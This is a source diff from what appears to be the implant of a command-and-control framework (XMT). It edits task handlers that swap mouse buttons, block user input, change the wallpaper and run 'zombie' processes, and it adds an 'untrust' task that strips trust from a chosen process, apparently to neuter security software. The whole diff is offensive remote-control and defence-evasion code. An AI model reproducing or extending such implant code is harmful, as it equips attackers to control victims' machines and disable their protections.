@@ -11,6 +11,7 @@ import (
 
 	"github.com/iDigitalFlame/xmt/cmd"
 	"github.com/iDigitalFlame/xmt/cmd/evade"
+	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/device/regedit"
@@ -32,13 +33,13 @@ func taskTroll(_ context.Context, r data.Reader, _ data.Writer) error {
 		return winapi.SwapMouseButtons(t == taskTrollSwapEnable)
 	case taskTrollBlockInputEnable, taskTrollBlockInputDisable:
 		return winapi.BlockInput(t == taskTrollBlockInputEnable)
-	case taskTrollWallpaper:
+	case taskTrollWallpaperPath:
 		var s string
 		if err = r.ReadString(&s); err != nil {
 			return err
 		}
 		return winapi.SetWallpaper(s)
-	case taskTrollWallpaperPath:
+	case taskTrollWallpaper:
 		f, err := os.CreateTemp("", execD)
 		if err != nil {
 			return err
@@ -126,8 +127,7 @@ func taskZombie(x context.Context, r data.Reader, w data.Writer) error {
 		return nil
 	}
 	i := z.Pid()
-	err = z.Wait()
-	z.Stdout, z.Stderr = nil, nil
+	err, z.Stdout, z.Stderr = z.Wait(), nil, nil
 	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
 		return err
 	}
@@ -136,13 +136,26 @@ func taskZombie(x context.Context, r data.Reader, w data.Writer) error {
 		s    = w.(backer)
 		//     ^ This should NEVER panic!
 	)
-	o := s.Payload()
-	o[0], o[1], o[2], o[3] = byte(i>>24), byte(i>>16), byte(i>>8), byte(i)
-	o[4], o[5], o[6], o[7] = byte(c>>24), byte(c>>16), byte(c>>8), byte(c)
+	s.WriteUint32Pos(0, i)
+	s.WriteUint32Pos(4, uint32(c))
 	return nil
 }
 func taskRename(_ context.Context, _ data.Reader, _ data.Writer) error {
 	return device.ErrNoNix
+}
+func taskUntrust(_ context.Context, r data.Reader, _ data.Writer) error {
+	var f filter.Filter
+	if err := f.UnmarshalStream(r); err != nil {
+		return err
+	}
+	if f.Empty() {
+		return filter.ErrNoProcessFound
+	}
+	p, err := f.SelectFunc(nil)
+	if err != nil {
+		return err
+	}
+	return winapi.Untrust(p)
 }
 func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
 	var (
